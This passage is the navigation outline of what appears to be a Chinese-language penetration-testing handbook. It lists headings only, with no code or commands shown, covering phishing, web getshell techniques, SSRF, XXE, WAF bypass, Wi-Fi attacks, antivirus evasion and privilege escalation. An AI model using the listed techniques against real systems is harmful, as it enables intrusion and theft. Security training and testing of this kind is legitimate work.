<li><a href="#%E7%BD%91%E7%AB%99url%E6%8F%90%E5%8F%96">网站URL提取</a></li>
<li><a href="#%E8%9C%9C%E7%BD%90%E5%88%A4%E6%96%AD%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%E5%8D%B3%E5%8F%AF">蜜罐判断(参考一下即可)</a></li>
<li><a href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81">默认密码</a></li>
<li><a href="#%E5%A6%82%E9%9C%80%E6%B3%A8%E5%86%8C">如需注册</a></li>
<li><a href="#%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF">企业信息</a></li>
</ul>
</li>
<li><p><a href="#%E5%85%A5%E5%8F%A3%E7%82%B9">入口点</a></p>
<ul>
<li><a href="#win10-%E5%AE%89%E8%A3%85kaliwsl">win10 安装kali(wsl)</a></li>
<li><a href="#%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB">水坑攻击</a><ul>
<li><a href="#xss%E5%85%8B%E9%9A%86%E9%92%93%E9%B1%BC">XSS克隆钓鱼</a></li>
<li><a href="#%E4%BC%AA%E9%80%A0%E9%A1%B5%E9%9D%A2%E9%92%93%E9%B1%BC">伪造页面钓鱼</a><ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%AF%B9%E5%A4%96%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">对外服务攻击</a><ul>
<li><a href="#web">Web</a><ul>
<li><a href="#%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">前端/逻辑漏洞</a><ul>
<li><a href="#%E6%B3%A8%E5%86%8C">注册</a></li>
<li><a href="#%E7%99%BB%E5%BD%95">登录</a></li>
<li><a href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE">任意密码重置</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a></li>
<li><a href="#%E5%90%8E%E5%8F%B0">后台</a></li>
</ul>
</li>
<li><a href="#jwt%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">JWT攻击手法</a><ul>
<li><a href="#%E6%9C%AA%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D">未校验签名</a></li>
<li><a href="#%E7%A6%81%E7%94%A8%E5%93%88%E5%B8%8C">禁用哈希</a></li>
<li><a href="#%E6%9A%B4%E7%A0%B4%E5%BC%B1%E5%AF%86%E9%92%A5">暴破弱密钥</a></li>
</ul>
</li>
<li><a href="#xss">XSS</a></li>
<li><a href="#csrf">CSRF</a></li>
<li><a href="#php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD">php任意文件读取/下载</a></li>
<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">php文件包含</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE">常用协议</a></li>
<li><a href="#getshell">Getshell</a><ul>
<li><a href="#allow_url_include-%E5%BC%80%E5%90%AF%E6%97%B6getshell">allow_url_include 开启时Getshell</a></li>
<li><a href="#allow_url_include-%E5%85%B3%E9%97%AD%E6%97%B6getshell">allow_url_include 关闭时Getshell</a></li>
<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell">包含日志文件getshell</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E4%B8%AA%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB">上传个图片格式的木马直接包含</a></li>
<li><a href="#%E9%99%90%E5%88%B6%E5%90%8E%E7%BC%80%E6%97%B6">限制后缀时</a></li>
<li><a href="#phpinfo-lfi-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell">phpinfo-LFI 本地文件包含临时文件getshell</a></li>
<li><a href="#session--lfi-getshell">session + lfi getshell</a></li>
<li><a href="#lfi-ssh-log">LFI SSH Log</a></li>
<li><a href="#rfi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BFmsf">RFI&amp;命令注入上线MSF</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#xml">XML</a><ul>
<li><a href="#xml%E6%B3%A8%E5%85%A5">XML注入</a></li>
<li><a href="#xxe">XXE</a><ul>
<li><a href="#%E5%88%A4%E6%96%AD">判断</a></li>
<li><a href="#%E6%8C%96%E6%8E%98">挖掘</a></li>
<li><a href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6">有回显读取本地文件</a></li>
<li><a href="#blind-oob-xxe%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96">Blind OOB XXE无回显读取</a></li>
<li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">列目录</a></li>
<li><a href="#%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE">不同平台支持的协议</a></li>
<li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">执行命令</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B">内网主机探测</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">内网端口扫描</a></li>
<li><a href="#%E5%86%85%E9%83%A8dtd%E5%88%A9%E7%94%A8">内部DTD利用</a></li>
<li><a href="#linux">Linux</a></li>
<li><a href="#windows">Windows</a></li>
<li><a href="#xxe%E5%86%99shell">XXE写shell</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ssrf">SSRF</a><ul>
<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
<li><a href="#%E6%88%90%E5%9B%A0">成因</a></li>
<li><a href="#%E6%8C%96%E6%8E%98">挖掘</a><ul>
<li><a href="#xml">XML</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a></li>
<li><a href="#mongodb">MongoDB</a></li>
<li><a href="#postgressql">PostgresSQL</a></li>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0">图片处理函数</a></li>
</ul>
</li>
<li><a href="#%E6%94%BB%E5%87%BB">攻击</a><ul>
<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">文件读取</a></li>
</ul>
</li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">端口探测</a><ul>
<li><a href="#ssrfredis">SSRF+Redis</a></li>
<li><a href="#302%E5%8F%8D%E5%BC%B9shell">302反弹shell</a></li>
<li><a href="#mysql">Mysql</a></li>
<li><a href="#weblogic-ssrfredis">Weblogic SSRF+Redis</a></li>
<li><a href="#ueditor-ssrf">Ueditor SSRF</a></li>
<li><a href="#discuz">Discuz</a></li>
<li><a href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">探测存活主机</a></li>
<li><a href="#%E5%86%85%E5%A4%96%E7%BD%91%E8%B5%84%E4%BA%A7%E5%AF%B9%E5%BA%94">内外网资产对应</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">绕过方法</a></li>
<li><a href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E6%8D%A2">gopher协议的脚本转换</a></li>
<li><a href="#%E5%8D%8F%E8%AE%AE">协议</a></li>
<li><a href="#dict%E5%8D%8F%E8%AE%AE%E5%86%99shell">dict协议写shell</a></li>
<li><a href="#slaveof%E5%A4%8D%E5%88%B6shell%E5%88%B0%E7%9B%AE%E6%A0%87">slaveof复制shell到目标</a></li>
<li><a href="#slaveof%E5%8F%8D%E5%BC%B9shell">slaveof反弹shell</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#fuzz%E6%89%AB%E6%8F%8Fweb">Fuzz/扫描web </a><ul>
<li><a href="#wfuzz">WFuzz</a></li>
<li><a href="#cewl">Cewl</a></li>
<li><a href="#dirsearch">Dirsearch</a></li>
</ul>
</li>
<li><a href="#bypass-waf">Bypass WAF</a><ul>
<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93">SQL注入分块传输</a></li>
<li><a href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BE%9B%E5%8F%AF%E7%94%A8%E7%9A%84tamper">自动提供可用的tamper</a></li>
<li><a href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE">垃圾数据</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0bypass">上传bypass</a><ul>
<li><a href="#%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4">图片文件头</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87%E5%A4%B4%E6%88%96%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%8C%85%E5%90%AB">添加图片头或合并图片包含</a></li>
<li><a href="#%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99">后缀大小写</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A00x09">文件名前缀加[0x09]</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0htaccess">上传.htaccess</a></li>
<li><a href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">二次渲染</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0php3php4phtml%E7%AD%89">上传php3,php4,phtml等</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E5%8A%A0data">文件名后加::$DATA</a></li>
<li><a href="#asp--%E7%A9%BA%E6%A0%BC">asp . (空格+.)</a></li>
<li><a href="#php-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9">php. .(点+空格+点)</a>)</li>
<li><a href="#%E5%8F%8C%E5%86%99phphpp">双写phphpp</a></li>
<li><a href="#00%E6%88%AA%E6%96%AD">00截断</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9%E4%B8%80%E4%BA%9B%E5%9B%BA%E5%AE%9A%E7%9A%84%E5%8F%82%E6%95%B0">修改一些固定的参数</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8E%BB%E6%8E%89%E5%8F%8C%E5%BC%95%E5%8F%B7">文件名去掉双引号</a></li>
<li><a href="#%E5%8A%A0%E4%B8%80%E4%B8%AAfilename1%E7%9A%84%E5%8F%82%E6%95%B0">加一个filename1的参数</a></li>
<li><a href="#form%E5%8F%98%E9%87%8F%E6%94%B9%E6%88%90form">form变量改成f+orm</a></li>
<li><a href="#%E5%8E%BB%E6%8E%89form-data">去掉form-data</a></li>
<li><a href="#%E5%9C%A8content-disposition%E6%88%96form-data%E5%90%8E%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%A9%BA%E6%A0%BC">在Content-Disposition或form-data;后添加多个空格</a></li>
<li><a href="#%E5%BC%95%E5%8F%B7%E5%9B%9E%E8%BD%A6">引号回车</a></li>
<li><a href="#content-type%E5%92%8Ccontent-disposition%E8%B0%83%E6%8D%A2%E4%BD%8D%E7%BD%AE">Content-Type和ConTent-Disposition调换位置</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A0%E7%A9%BA%E6%A0%BC">文件名前缀加空格</a></li>
<li><a href="#name%E5%89%8D%E5%8A%A0%E7%A9%BA%E6%A0%BC">name前加空格</a></li>
<li><a href="#form-data%E7%9A%84%E5%89%8D%E5%90%8E%E5%8A%A0%E4%B8%8A">form-data的前后加上+</a></li>
</ul>
</li>
<li><a href="#aspiis">ASP+IIS</a></li>
<li><a href="#aspiisaspxiis">Asp+iis&amp;aspx+iis</a></li>
<li><a href="#apache">apache</a></li>
<li><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97">大小写/关键字</a></li>
<li><a href="#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81">双重url编码</a></li>
<li><a href="#%E5%8F%98%E6%8D%A2%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">变换请求方式</a></li>
<li><a href="#hpp%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93">HPP参数污染</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a><ul>
<li><a href="#access">Access</a></li>
<li><a href="#mysql">Mysql</a></li>
<li><a href="#mssql">MSSQL</a></li>
</ul>
</li>
<li><a href="#waf">WAF</a></li>
</ul>
</li>
<li><a href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">未授权访问</a><ul>
<li><a href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Redis未授权访问</a><ul>
<li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li>
<li><a href="#js%E6%89%93%E5%86%85%E7%BD%91">JS打内网</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
<li><a href="#%E5%86%99shell">写shell</a></li>
<li><a href="#ssh">SSH</a></li>
<li><a href="#redis-rogue-getshell">redis-rogue-getshell</a></li>
<li><a href="#redis-rogue-server">redis-rogue-server</a></li>
<li><a href="#redis%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8">redis在windows下的利用</a></li>
<li><a href="#lua-rce">Lua RCE</a></li>
</ul>
</li>
<li><a href="#jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Jenkins未授权访问</a></li>
<li><a href="#mongodb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">MongoDB未授权访问</a></li>
<li><a href="#zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">ZooKeeper未授权访问</a></li>
<li><a href="#elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Elasticsearch未授权访问</a></li>
<li><a href="#memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Memcache未授权访问</a></li>
<li><a href="#hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Hadoop未授权访问</a></li>
<li><a href="#docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Docker未授权访问</a></li>
<li><a href="#activemq%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">ActiveMQ未授权访问</a></li>
<li><a href="#jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">JBOSS未授权访问</a></li>
</ul>
</li>
<li><a href="#%E9%98%BF%E9%87%8C%E4%BA%91oss-key%E5%88%A9%E7%94%A8">阿里云OSS Key利用</a></li>
<li><a href="#linux%E7%BB%95%E8%BF%87disable_function">Linux绕过disable_function</a><ul>
<li><a href="#ld_preload">LD_PRELOAD</a></li>
<li><a href="#php70-73-bypass">php7.0-7.3 bypass</a></li>
<li><a href="#windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6com%E7%BB%95%E8%BF%87">windows系统组件com绕过</a></li>
<li><a href="#cgi%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F">CGI启动方式</a></li>
<li><a href="#imagemagick%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87">ImageMagick组件绕过</a></li>
<li><a href="#%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87">常规函数绕过</a></li>
<li><a href="#pcntl_exec">pcntl_exec</a></li>
<li><a href="#imap_open%E5%87%BD%E6%95%B0">imap_open函数</a></li>
<li><a href="#php74-ffi%E7%BB%95%E8%BF%87">php7.4 FFI绕过</a></li>
<li><a href="#shellshock">shellshock</a></li>
<li><a href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6">蚁剑插件</a></li>
</ul>
</li>
<li><a href="#open_basedir%E7%BB%95%E8%BF%87">open_basedir绕过</a></li>
<li><a href="#tomcat-ajp-lfirce">Tomcat Ajp LFI&amp;RCE    </a></li>
<li><a href="#mysql%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">Mysql连接文件读取</a></li>
<li><a href="#mysql%E5%BC%80%E5%90%AF%E5%A4%96%E8%BF%9E">Mysql开启外连</a></li>
<li><a href="#mssqlagent-job%E4%B8%8A%E7%BA%BF">MSSQL&amp;Agent Job上线</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E6%97%A0%E5%88%97%E5%90%8D">注入无列名</a></li>
<li><a href="#dnslog">DNSLog</a><ul>
<li><a href="#%E6%B3%A8%E5%85%A5">注入</a><ul>
<li><a href="#mysql">MYSQL</a></li>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#postgresql">postgreSQL</a></li>
<li><a href="#oracle">Oracle</a></li>
</ul>
</li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a></li>
<li><a href="#xxe">XXE</a></li>
<li><a href="#struts">Struts</a></li>
<li><a href="#weblogic">weblogic</a></li>
<li><a href="#resin">Resin</a></li>
<li><a href="#discuz">Discuz</a></li>
</ul>
</li>
<li><a href="#phpmyadmin">PHPMyadmin</a><ul>
<li><a href="#log">LOG</a></li>
<li><a href="#%E6%85%A2%E6%9F%A5%E8%AF%A2">慢查询</a></li>
<li><a href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">任意文件读取</a></li>
<li><a href="#lfi">LFI</a></li>
<li><a href="#rce">RCE</a></li>
</ul>
</li>
<li><a href="#php-fpm-rce">PHP-FPM RCE</a></li>
<li><a href="#phpstudy%E5%90%8E%E9%97%A8">phpstudy后门</a></li>
<li><a href="#cmdhijack">cmdhijack</a></li>
</ul>
</li>
<li><a href="#database">Database</a><ul>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#postgresql">PostgreSQL</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB">近源攻击</a><ul>
<li><a href="#wi-fi%E7%A0%B4%E8%A7%A3">WI-FI破解</a><ul>
<li><a href="#wifite">wifite</a></li>
<li><a href="#aircrack-ng">Aircrack-ng</a></li>
</ul>
</li>
<li><a href="#%E9%92%93%E9%B1%BC%E7%BD%91%E7%BB%9C">钓鱼网络</a><ul>
<li><a href="#hostapd">Hostapd</a></li>
<li><a href="#hostapd-wpe">Hostapd-wpe</a></li>
</ul>
</li>
<li><a href="#%E6%97%A0%E7%BA%BF%E5%B9%B2%E6%89%B0">无线干扰</a><ul>
<li><a href="#beacon-flood">Beacon flood</a></li>
<li><a href="#deauth-flood">Deauth flood</a></li>
<li><a href="#mdk3-destruction">Mdk3 destruction</a></li>
<li><a href="#wifi%E8%8A%AF%E7%89%87esp8266">WiFi芯片esp8266</a></li>
<li><a href="#mdk4">Mdk4</a></li>
<li><a href="#cve-2018-4407">CVE-2018-4407</a></li>
<li><a href="#%E7%BB%95%E8%BF%87mac%E5%9C%B0%E5%9D%80%E8%AE%A4%E8%AF%81">绕过mac地址认证</a><ul>
<li><a href="#ifconfig">Ifconfig</a></li>
<li><a href="#macchanger">Macchanger</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#badusb">BadUSB</a></li>
<li><a href="#%E5%85%8B%E9%9A%86%E5%8D%A1">克隆卡</a></li>
<li><a href="#%E8%93%9D%E7%89%99">蓝牙</a></li>
</ul>
</li>
<li><a href="#%E9%B1%BC%E5%8F%89%E5%BC%8F%E6%94%BB%E5%87%BB">鱼叉式攻击</a><ul>
<li><a href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">钓鱼邮件</a><ul>
<li><a href="#cve">CVE</a><ul>
<li><a href="#cve-2017-11882">CVE-2017-11882</a></li>
<li><a href="#cve-2017-0199">CVE-2017-0199</a></li>
<li><a href="#cve-2012-0158">CVE-2012-0158</a></li>
<li><a href="#cve-2017-0143">CVE-2017-0143</a></li>
</ul>
</li>
<li><a href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">可执行文件</a></li>
<li><a href="#%E6%96%87%E6%A1%A3%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E9%80%A0">文档文件的伪造</a></li>
<li><a href="#%E6%89%A9%E5%B1%95%E5%90%8D%E5%9B%BE%E6%A0%87">扩展名/图标</a></li>
<li><a href="#%E6%8D%86%E7%BB%91">捆绑</a></li>
<li><a href="#%E5%AE%8F">宏</a></li>
<li><a href="#0day">0day</a></li>
<li><a href="#chm">CHM</a></li>
</ul>
</li>
<li><a href="#%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5">钓鱼链接</a><ul>
<li><a href="#url%E8%B7%B3%E8%BD%AC">URL跳转</a></li>
<li><a href="#%E7%BB%93%E5%90%88%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3%E6%88%96%E7%A8%8B%E5%BA%8F">结合恶意文档或程序</a></li>
<li><a href="#%E7%9F%ADurl">短URL</a></li>
<li><a href="#%E7%BB%93%E5%90%88%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB">结合水坑攻击</a></li>
<li><a href="#%E7%9B%B8%E4%BC%BC%E5%9F%9F%E5%90%8D">相似域名</a></li>
<li><a href="#%E5%9F%9F%E5%90%8D%E7%AA%83%E5%8F%96">域名窃取</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E9%B1%BC%E5%8F%89">第三方服务鱼叉</a></li>
</ul>
</li>
</ul>
</li>
<li><p><a href="#%E5%85%8D%E6%9D%80">免杀</a></p>
<ul>
<li><a href="#msf%E5%85%8D%E6%9D%80">MSF免杀</a><ul>
<li><a href="#nps_payload">nps_payload</a></li>
<li><a href="#%E7%BC%96%E7%A0%81%E5%99%A8">编码器</a></li>
<li><a href="#cc%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">c/c++源码免杀</a><ul>
<li><a href="#%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C">指针执行</a></li>
<li><a href="#%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98">申请动态内存</a></li>
<li><a href="#%E5%B5%8C%E5%85%A5%E6%B1%87%E7%BC%96">嵌入汇编</a></li>
<li><a href="#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">强制类型转换</a></li>
<li><a href="#%E6%B1%87%E7%BC%96%E8%8A%B1%E6%8C%87%E4%BB%A4">汇编花指令</a></li>
<li><a href="#xor%E5%8A%A0%E5%AF%86">XOR加密</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5">远程线程注入</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%85%8D%E6%9D%80">加载器免杀</a><ul>
<li><a href="#shellcode_launcher">shellcode_launcher</a></li>
<li><a href="#ssi%E5%8A%A0%E8%BD%BD">SSI加载</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#c%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">c#源码免杀</a><ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91">直接编译</a></li>
<li><a href="#%E5%8A%A0%E5%AF%86%E5%A4%84%E7%90%86">加密处理</a></li>
<li><a href="#xoraes%E7%BC%96%E7%A0%81">XOR/AES编码</a></li>
<li><a href="#cscinstallutil">CSC+InstallUtil</a></li>
</ul>
</li>
<li><a href="#python%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">Python源码免杀</a><ul>
<li><a href="#pyinstaller%E5%8A%A0%E8%BD%BDc%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91">pyinstaller加载C代码编译</a></li>
<li><a href="#pyinstaller%E5%8A%A0%E8%BD%BDpy%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91">pyinstaller加载py代码编译(*)</a></li>
<li><a href="#py2exe%E6%89%93%E5%8C%85exe">Py2exe打包exe</a></li>
<li><a href="#base64%E7%BC%96%E7%A0%81pyinstaller%E6%89%93%E5%8C%85">Base64编码+Pyinstaller打包</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB">加载器分离</a><ul>
<li><a href="#hex">hex</a></li>
<li><a href="#base64">Base64(*)</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dll%E5%8A%AB%E6%8C%81">DLL劫持</a></li>
<li><a href="#msbuild">MSBuild</a></li>
<li><a href="#greatsct">GreatSCT</a></li>
<li><a href="#mshta">Mshta</a></li>
<li><a href="#installutil">InstallUtil</a></li>
<li><a href="#veil">Veil</a></li>
<li><a href="#rc4">RC4</a></li>
<li><a href="#%E6%8D%86%E7%BB%91">捆绑</a></li>
<li><a href="#evasion%E6%A8%A1%E5%9D%97">Evasion模块</a></li>
<li><a href="#phantom-evasion">Phantom-Evasion</a></li>
<li><a href="#shellter">Shellter</a></li>
<li><a href="#the-backdoor-factory">the-backdoor-factory</a></li>
<li><a href="#zirikatu">zirikatu</a></li>
<li><a href="#hanzoinjection">hanzoInjection</a></li>
</ul>
</li>
<li><a href="#powershell%E5%85%8D%E6%9D%80">PowerShell免杀</a><ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90">直接生成</a></li>
<li><a href="#%E5%88%86%E5%9D%97%E5%85%8D%E6%9D%80">分块免杀</a></li>
<li><a href="#invoke-shellcode%E5%8A%A0%E8%BD%BD">Invoke-Shellcode加载</a></li>
<li><a href="#invoke-obfuscation">Invoke-Obfuscation</a></li>
<li><a href="#xencrypt">Xencrypt</a></li>
<li><a href="#pyfuscation">PyFuscation</a></li>
<li><a href="#%E6%8B%86%E5%88%86c%E7%BC%96%E8%AF%91">拆分+C编译</a></li>
<li><a href="#%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B">行为检测</a></li>
<li><a href="#out-encryptedscript">Out-EncryptedScript</a></li>
<li><a href="#cobalt-strike-powershell%E5%85%8D%E6%9D%80">cobalt strike powershell免杀</a></li>
</ul>
</li>
<li><a href="#ruby">Ruby</a></li>
<li><a href="#golang">Golang</a><ul>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8">加载器</a><ul>
<li><a href="#go-shellcode">go-shellcode</a></li>
<li><a href="#gsl">Gsl</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="#%E5%86%85%E7%BD%91%E5%9F%9F">内网&amp;域</a></p>
<ul>
<li><a href="#powershell">Powershell</a><ul>
<li><a href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C">远程执行</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDexe">加载exe</a></li>
<li><a href="#exe2ps1">EXE2PS1</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5">绕过策略</a><ul>
<li><a href="#base64">Base64</a></li>
<li><a href="#%E5%86%99%E5%85%A5bat%E7%BB%95%E8%BF%87">写入bat绕过</a></li>
<li><a href="#%E6%8B%BC%E6%8E%A5%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2">拼接拆分字符串</a></li>
<li><a href="#replace%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0">Replace替换函数</a></li>
<li><a href="#http%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87">HTTP字符拼接绕过</a></li>
<li><a href="#%E5%9B%BE%E7%89%87%E5%85%8D%E6%9D%80">图片免杀</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDshellcode">加载shellcode</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDdll">加载dll</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#windows%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6sid">Windows安全标识符(SID)</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a><ul>
<li><a href="#impacket%E5%B7%A5%E5%85%B7%E5%8C%85">Impacket工具包</a></li>
<li><a href="#windows-exploit-suggester">Windows-exploit-suggester</a></li>
<li><a href="#wesng">Wesng</a></li>
<li><a href="#searchsploit">Searchsploit</a></li>
<li><a href="#%E6%BF%80%E6%B4%BBguest">激活guest</a></li>
<li><a href="#mysql-udf">MYSQL udf</a></li>
<li><a href="#mysql-linux-root">MYSQL Linux Root</a></li>
<li><a href="#mssql">MSSQL</a><ul>
<li><a href="#xp_cmdshell">xp_cmdshell</a></li>
<li><a href="#xp_regwrite">xp_regwrite</a></li>
<li><a href="#xp_dirtree">xp_dirtree</a></li>
